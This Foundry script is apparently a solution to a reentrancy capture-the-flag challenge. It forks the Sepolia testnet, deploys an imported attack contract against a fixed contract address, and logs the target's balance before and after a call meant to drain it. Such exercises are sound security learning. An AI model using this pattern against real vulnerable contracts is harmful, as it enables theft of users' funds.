// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Reentrance, ReentranceHack} from "../src/Reentrance.sol";

contract ReentranceScript is Script {
    function setUp() public {}

    function run() public {
        hackContract();
    }

    function hackContract() internal {
        uint256 sepolia = vm.createFork(vm.rpcUrl("sepolia"));

        address ReentranceAddress = 0x190bd3215C21c26057916C4C3136E1944F6FCe48;
        vm.selectFork(sepolia);

        vm.startBroadcast();

        console.log("Starting Hacking");

        ReentranceHack hack = new ReentranceHack(ReentranceAddress);

        uint256 inital_contractBalance = address(ReentranceAddress).balance;
        console.log("Initial Contract Balance", inital_contractBalance);

        hack.hack{value: inital_contractBalance}();

        uint256 final_contractBalance = address(ReentranceAddress).balance;
        console.log("Final Contract Balance", final_contractBalance);

        vm.stopBroadcast();
    }
}
